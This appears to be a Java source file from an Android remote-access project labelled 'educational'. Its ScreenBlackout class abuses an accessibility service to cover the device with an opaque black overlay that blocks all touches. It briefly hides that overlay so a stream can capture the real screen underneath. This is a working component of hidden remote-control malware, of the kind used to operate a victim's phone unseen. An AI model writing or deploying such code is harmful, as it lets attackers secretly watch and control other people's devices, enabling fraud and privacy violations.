package com.remoteaccess.educational.commands;

import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import com.remoteaccess.educational.services.UnifiedAccessibilityService;
import org.json.JSONObject;

/**
 * ScreenBlackout — draws a full-screen opaque black overlay using TYPE_ACCESSIBILITY_OVERLAY.
 *
 * Uses the accessibility service's WindowManager so NO SYSTEM_ALERT_WINDOW permission
 * is required. The overlay is created in the context of UnifiedAccessibilityService.
 *
 * Has its own dedicated fast-path: commands are applied immediately via postAtFrontOfQueue
 * to avoid queuing behind stream frames or other work.
 */
public class ScreenBlackout {

    private static final String TAG = "ScreenBlackout";

    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private final Object  lock        = new Object();

    private UnifiedAccessibilityService service     = null;
    private View                        overlayView = null;
    private boolean                     active      = false;
    private boolean                     viewAttached = false;

    private static volatile ScreenBlackout instance;

    public static ScreenBlackout getInstance() {
        if (instance == null) {
            synchronized (ScreenBlackout.class) {
                if (instance == null) instance = new ScreenBlackout();
            }
        }
        return instance;
    }

    private ScreenBlackout() {}

    /** Called by UnifiedAccessibilityService.onServiceConnected() */
    public void setService(UnifiedAccessibilityService svc) {
        synchronized (lock) { this.service = svc; }
        Log.i(TAG, "Accessibility service registered — blackout ready");
    }

    /** Called by UnifiedAccessibilityService.onUnbind() */
    public void clearService() {
        synchronized (lock) {
            if (active) removeOverlay();
            this.service = null;
        }
        Log.i(TAG, "Accessibility service unregistered");
    }

    public boolean isActive() {
        synchronized (lock) { return active; }
    }

    /** Enable black screen — runs at front of main queue for minimum latency. */
    public JSONObject enableBlackout() {
        JSONObject result = new JSONObject();
        try {
            synchronized (lock) {
                if (active) {
                    result.put("success", true);
                    result.put("message", "Screen blackout already active");
                    return result;
                }
                if (service == null) {
                    result.put("success", false);
                    result.put("error", "Accessibility service not running — enable it first");
                    return result;
                }
            }

            final Object latch      = new Object();
            final boolean[] done    = {false};
            final boolean[] success = {false};

            // postAtFrontOfQueue = highest priority, applied before pending frames
            mainHandler.postAtFrontOfQueue(() -> {
                synchronized (lock) {
                    try {
                        if (service == null || active) return;

                        View v = new View(service);
                        v.setBackgroundColor(Color.BLACK);
                        v.setOnTouchListener((view, event) -> true); // consume all touches

                        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                                WindowManager.LayoutParams.MATCH_PARENT,
                                WindowManager.LayoutParams.MATCH_PARENT,
                                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                                        | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                                        | WindowManager.LayoutParams.FLAG_FULLSCREEN
                                        | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                                PixelFormat.OPAQUE
                        );

                        WindowManager wm = (WindowManager)
                                service.getSystemService(android.content.Context.WINDOW_SERVICE);
                        wm.addView(v, params);

                        overlayView  = v;
                        active       = true;
                        viewAttached = true;
                        success[0]   = true;
                        Log.i(TAG, "Screen blackout ENABLED via TYPE_ACCESSIBILITY_OVERLAY");
                    } catch (Exception e) {
                        Log.e(TAG, "enableBlackout error: " + e.getMessage());
                    }
                }
                synchronized (latch) { done[0] = true; latch.notifyAll(); }
            });

            synchronized (latch) {
                long deadline = System.currentTimeMillis() + 1500;
                while (!done[0] && System.currentTimeMillis() < deadline) {
                    try { latch.wait(50); } catch (InterruptedException ignored) { break; }
                }
            }

            synchronized (lock) {
                if (success[0]) {
                    result.put("success", true);
                    result.put("message", "Screen blackout enabled");
                } else {
                    result.put("success", false);
                    result.put("error", "Failed to attach overlay — accessibility service may not be active");
                }
            }
        } catch (Exception e) {
            try { result.put("success", false); result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }

    /** Disable black screen — runs at front of main queue for minimum latency. */
    public JSONObject disableBlackout() {
        JSONObject result = new JSONObject();
        try {
            synchronized (lock) {
                if (!active && !viewAttached) {
                    result.put("success", true);
                    result.put("message", "Screen blackout already inactive");
                    return result;
                }
            }

            final Object latch   = new Object();
            final boolean[] done = {false};

            mainHandler.postAtFrontOfQueue(() -> {
                synchronized (lock) { removeOverlay(); }
                synchronized (latch) { done[0] = true; latch.notifyAll(); }
            });

            synchronized (latch) {
                long deadline = System.currentTimeMillis() + 1500;
                while (!done[0] && System.currentTimeMillis() < deadline) {
                    try { latch.wait(50); } catch (InterruptedException ignored) { break; }
                }
            }

            result.put("success", true);
            result.put("message", "Screen blackout disabled");
        } catch (Exception e) {
            try { result.put("success", false); result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }

    /** Must be called on main thread while holding lock. */
    private void removeOverlay() {
        try {
            if (overlayView != null && viewAttached && service != null) {
                WindowManager wm = (WindowManager)
                        service.getSystemService(android.content.Context.WINDOW_SERVICE);
                wm.removeView(overlayView);
            }
        } catch (Exception e) {
            Log.e(TAG, "disableBlackout removeView: " + e.getMessage());
        } finally {
            overlayView  = null;
            active       = false;
            viewAttached = false;
            Log.i(TAG, "Screen blackout DISABLED");
        }
    }

    /**
     * Briefly hide the overlay so the streaming thread can capture real content,
     * then immediately restore it. Uses postAtFrontOfQueue for minimal frame delay.
     */
    public void runWithOverlayHidden(Runnable captureTask) {
        boolean isActive;
        synchronized (lock) { isActive = active && viewAttached && overlayView != null; }

        if (!isActive) {
            captureTask.run();
            return;
        }

        final Object captureLock = new Object();
        final boolean[] done     = {false};

        mainHandler.postAtFrontOfQueue(() -> {
            View v;
            synchronized (lock) { v = overlayView; }
            try {
                if (v != null) v.setVisibility(View.INVISIBLE);
                captureTask.run();
            } finally {
                if (v != null) {
                    synchronized (lock) {
                        if (active && viewAttached) v.setVisibility(View.VISIBLE);
                    }
                }
                synchronized (captureLock) { done[0] = true; captureLock.notifyAll(); }
            }
        });

        synchronized (captureLock) {
            long deadline = System.currentTimeMillis() + 400;
            while (!done[0] && System.currentTimeMillis() < deadline) {
                try { captureLock.wait(30); } catch (InterruptedException ignored) { break; }
            }
        }
    }
}
